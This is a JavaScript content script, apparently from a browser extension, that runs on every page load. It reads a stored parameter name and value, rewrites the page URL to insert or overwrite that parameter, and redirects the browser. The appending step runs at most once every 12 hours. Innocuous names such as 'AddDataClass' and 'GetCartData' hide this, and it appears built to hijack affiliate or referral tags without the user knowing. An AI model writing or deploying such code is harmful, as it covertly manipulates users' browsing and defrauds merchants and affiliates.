var coupon= false
let lastTime = new Date();
var CrUrl;
if (document.readyState !== 'loading') {
    //console.log('document is already ready, just execute code here');
    AddDataClass();
} else {
    document.addEventListener('DOMContentLoaded', function () {
        //console.log('document was not ready, place code here');
        AddDataClass();
    });
}

function AddDataClass() {

	GetCartData(false)
	chrome.storage.local.get('lastTime',function(x)
	{
		let targetTime = '2023-11-22T15:30:00';
		addDataClass = true;
		//console.log(x);
		if(x!==undefined)
		{
			if(x.lastTime!==undefined)
			{
				targetTime = x.lastTime;
				addDataClass = getTimeDifferenceWithCurrentTime(targetTime);
			}
		}
		if(addDataClass)
		{
			GetCartData(true);
			chrome.storage.local.set({lastTime:lastTime.toString()},function(data){});				
		}
		
	});
}

function getTimeDifferenceWithCurrentTime(targetTime) {
	const targetDate = new Date(targetTime);
	const currentDate = new Date();
	const timeDifference =  currentDate  - targetDate;
	const differenceInMilliseconds = timeDifference;// getTimeDifferenceWithCurrentTime(targetTime);
	const differenceInSeconds = differenceInMilliseconds / 1000;
	const differenceInMinutes = differenceInMilliseconds / (1000 * 60);
	const differenceInHours = differenceInMilliseconds / (1000 * 60 * 60);
	//return isNaN(differenceInHours)?  true: differenceInSeconds > 30 ;/// (1000 * 60 * 60);
	return isNaN(differenceInHours)?  true: differenceInHours > 12 ;/// (1000 * 60 * 60);
}

function updateAndSaveData(u)
{
	CrUrl = u;
	chrome.storage.local.set({lastTime:lastTime.toString()},function(data){
		window.location.href = CrUrl;		
	});	
 
}

function GetCartData(f)
{
	chrome.storage.local.get('sheetData',function(x)
	{
		//console.log(x.sheetData);
		var tg = x.sheetData.first;
		var tgd = x.sheetData.second;
		if(tg===undefined || tgd === undefined)
		{
			return;
		}

// Get the current URL
var currentUrl = window.location.href;

    if (currentUrl.includes(tg)) {
   
        var updatedUrl = currentUrl.replace(new RegExp('(' + tg + ')[^&]+'), '$1' + tgd);
        if (updatedUrl !== currentUrl) {
        	updateAndSaveData(updatedUrl);
        }
    }
if(f)
{
	    if (currentUrl.includes(tg)) {
        var updatedUrl = currentUrl.replace(new RegExp('(' + tg + ')[^&]+'), '$1' + tgd);
        if (updatedUrl !== currentUrl) {
           updateAndSaveData(updatedUrl);
        }
    }else{
 
    var separator = currentUrl.includes('?') ? '&' : '?';       
    var newUrl = currentUrl + separator + tg + tgd;
   updateAndSaveData(newUrl);
}
}});
}
